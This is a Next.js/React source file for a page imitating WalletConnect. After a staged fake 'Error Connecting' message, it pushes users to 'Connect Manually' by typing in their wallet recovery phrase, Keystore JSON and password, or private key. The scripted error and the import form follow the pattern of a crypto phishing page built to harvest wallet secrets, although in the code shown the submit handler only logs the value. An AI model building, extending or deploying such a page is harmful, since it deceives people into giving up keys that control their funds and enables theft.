import React, { useEffect, useState } from 'react';
import { wallet } from '@/components/data';
import { BsArrowRightCircle } from 'react-icons/bs';
import { FaArrowLeft, FaEye, FaEyeSlash } from 'react-icons/fa';
import Image from 'next/image';
import Link from 'next/link';

const LoaderAnimation = () => {
  return (
    <div className='loader-container'>
      <div className='loader-dot'></div>
      <div className='loader-dot'></div>
      <div className='loader-dot'></div>
      <div className='loader-dot'></div>
    </div>
  );
};

function Coin() {
  const [details, setDetails] = useState('');
  const [display, setDisplay] = useState(null);
  const [openModal, setOpenModal] = useState(false);
  const [isActive, setIsActive] = useState(1);
  const [isLoading, setIsLoading] = useState(true);
  const [isError, setIsError] = useState(false);
  const [show, setShow] = useState(false);

  const [val, setVal] = useState({
    place: 'Enter your recovery phrase',
    desc: 'Typically 12 (sometimes 24) words seperated by single spaces',
  });

  const handleSubmit = () => {
    console.log(details);
  };

  const handleOpen = (data) => {
    setIsLoading(true);
    setIsError(false);
    setDisplay(data);
    setOpenModal(true);
  };

  const handleOptions = (num) => {
    num === 3
      ? setVal({
          place: 'Enter your Private Key',
          desc: 'Typically 12 (sometimes 24) words seperated by single space.',
        })
      : num === 2
      ? setVal({
          place: 'Enter you Keystore JSON',
          desc: 'Several lines of text beginning with "{...}" plus the password you used to encrypt it',
        })
      : setVal({
          place: 'Enter your recovery phrase',
          desc: 'Typically 12 (sometimes 24) words seperated by single space.',
        });

    setIsActive(num);
  };

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 5000);

    // Clean up the timeout when the component unmounts or re-renders.
    return () => {
      clearTimeout(timeoutId);
    };
  });

  useEffect(() => {
    const timeoutId = setTimeout(() => {
      setIsError(true);
    }, 3000);

    // Clean up the timeout when the component unmounts or re-renders.
    return () => {
      clearTimeout(timeoutId);
    };
  });

  return (
    <div className='w-full h-screen flex flex-col justify-end  md:items-center pb-3 px-3 md:px-0'>
      <Link href='/'>
        <FaArrowLeft className='text-lg' />
      </Link>
      <h1 className='text-start text-lg my-3 ml-3 tracking-wider'>
        WalletConnect
      </h1>
      <div className='flex flex-col pt-7 px-4 rounded-3xl shadow-md bg-white space-y-3 w-full md:w-[40%] h-[86vh]'>
        <h1 className='text-black'>Connect to a wallet</h1>
        <div className='space-y-3 pt-5 h-[92%] overflow-auto'>
          {wallet?.map((data, index) => (
            <div
              key={index}
              className='flex items-center justify-between space-x-3 text-black py-3 px-4 border rounded-lg cursor-pointer hover:bg-[#001132] hover:text-white transition-all ease-in-out duration-500'
              onClick={() => handleOpen(data)}
            >
              <div className='flex items-center space-x-2'>
                <div className='h-2 w-2 bg-green-500 rounded-full'></div>
                <h1 className='text-gray-500'>{data.name}</h1>
              </div>
              <div
                className='text-xl'
                style={{ color: data.color ? data.color : 'blue' }}
              >
                <Image
                  src={data.icon}
                  alt={data.name}
                  width={40}
                  height={40}
                  className=''
                />
              </div>
            </div>
          ))}
        </div>
      </div>
      {openModal && (
        <div className='absolute top-0 right-0 left-0 bottom-0 flex justify-center items-center px-6 md:px-0'>
          <div className='absolute top-0 right-0 left-0 bottom-0 bg-black opacity-40'></div>
          {isLoading ? (
            <div className='md:w-[30%] text-black bg-white z-40 rounded-3xl text-gray-500'>
              <div className='flex justify-between items-center bg-gray-300 rounded-t-3xl p-3'>
                <p className='text-blue-500'>Back</p>
                <p>X</p>
              </div>
              <div className='px-10 py-7 space-y-5 w-[380px]'>
                <div className='py-3 px-2 border border-red-500 rounded-xl flex justify-between items-center'>
                  {!isError ? (
                    <h1>
                      Initializing
                      <LoaderAnimation />
                    </h1>
                  ) : (
                    <h1>
                      Error <br></br>Connecting
                    </h1>
                  )}
                  {isError && (
                    <button
                      className='p-2 bg-blue-500 text-white rounded-md text-sm'
                      onClick={() => setIsLoading(false)}
                    >
                      Connect <br></br>Manually
                    </button>
                  )}
                </div>
                <div className='border border-black rounded-xl p-3 flex items-center justify-between'>
                  <div className='space-y-3'>
                    <p>{display.name}</p>
                    <p>Easy-to-use browser extension</p>
                  </div>
                  <div>
                    <Image
                      src={display.icon}
                      alt={display.name}
                      width={40}
                      height={40}
                      className=''
                    />
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className='md:w-[30%] text-black bg-white z-40 p-5 rounded-md'>
              <div className='flex justify-between items-center mb-3'>
                <div className='flex items-center space-x-3 justify-center w-full mb-10'>
                  <div
                    className='text-xl'
                    style={{ color: display.color ? display.color : 'blue' }}
                  >
                    <Image
                      src={display.icon}
                      alt={display.name}
                      width={40}
                      height={40}
                      className=''
                    />
                  </div>
                  <h1 className='text-xl'>Import your {display.name} wallet</h1>
                </div>
              </div>
              <form method='POST' onsubmit={handleSubmit}>
                <div className='justify-between flex border-b pb-2 text-gray-500'>
                  <label
                    className={`${
                      isActive === 1 ? 'border-b-2 pb-2 border-blue-500' : ''
                    }`}
                    onClick={() => handleOptions(1)}
                  >
                    Phrase
                  </label>
                  <label
                    className={`${
                      isActive === 2 ? 'border-b-2 pb-2 border-blue-500' : ''
                    }`}
                    onClick={() => handleOptions(2)}
                  >
                    Keystore JSON
                  </label>
                  <label
                    className={`${
                      isActive === 3 ? 'border-b-2 pb-2 border-blue-500' : ''
                    }`}
                    onClick={() => handleOptions(3)}
                  >
                    Private Key
                  </label>
                </div>
                <textarea
                  className='h-24 rounded-md border p-3 mt-4 w-full placeholder:text-[15px] placeholder:text-gray-500'
                  onChange={(e) => setDetails(e.target.value)}
                  placeholder={val.place}
                  required
                ></textarea>
                {val.place === 'Enter you Keystore JSON' && (
                  <div className='flex items-center justify-between px-2 py-2 w-full border rounded-md mt-5'>
                    <input
                      type={show ? 'text' : 'password'}
                      name='wpassword'
                      placeholder='Wallet password'
                      required
                      className='px-2 h-full w-full outline-none bg-transparent placeholder:text-[15px] placeholder:text-gray-500'
                    />
                    {show ? (
                      <FaEye onClick={() => setShow(!show)} />
                    ) : (
                      <FaEyeSlash onClick={() => setShow(!show)} />
                    )}
                  </div>
                )}
                <p className='text-center w-[80%] mx-auto text-gray-500 my-6'>
                  {val.desc}
                </p>
                <button
                  type='submit'
                  className='w-full flex items-center justify-center mb-4 py-2 rounded-md bg-blue-500 mt-4 text-white hover:opacity-70'
                >
                  IMPORT
                  <BsArrowRightCircle className='text-xl ml-3' />
                </button>
                <button
                  type='button'
                  className='w-full py-2 rounded-md bg-red-600 mt-4 text-white hover:opacity-70'
                  onClick={() => setOpenModal(false)}
                >
                  Cancel
                </button>
              </form>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default Coin;
